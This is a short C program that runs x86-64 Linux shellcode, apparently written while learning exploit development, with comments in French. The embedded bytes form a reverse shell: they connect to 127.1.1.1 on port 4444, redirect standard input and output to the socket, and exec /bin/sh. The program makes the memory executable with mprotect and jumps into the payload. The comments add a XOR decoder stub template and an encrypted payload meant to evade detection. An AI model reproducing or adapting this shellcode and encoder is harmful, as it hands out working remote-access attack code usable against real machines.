#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// "\xeb\x11\x5e\x31\xc9\xb1\xTailleDuShellCode\x80\x74\x0e\xff\xValeurDeLaCleXOR\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff" //
// Shell chiffre : \x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\xf9\x23\x4b\x1a\xa1\x67\x2a

int main(){
unsigned char *shellcode = "\xb0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xd2\x0f\x05\x49\x89\xc1\x6a\x2a\x58\x4c\x89\xcf\x52\x52\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x48\x31\xf6\x40\xb6\x02\x48\x31\xc0\xb0\x21\x0f\x05\x48\xff\xce\x7d\xf4\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05";
  printf("Shellcode length: %x\n", strlen(shellcode));
  int r =  mprotect((void *)((int)shellcode & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())shellcode;
  return ret();
}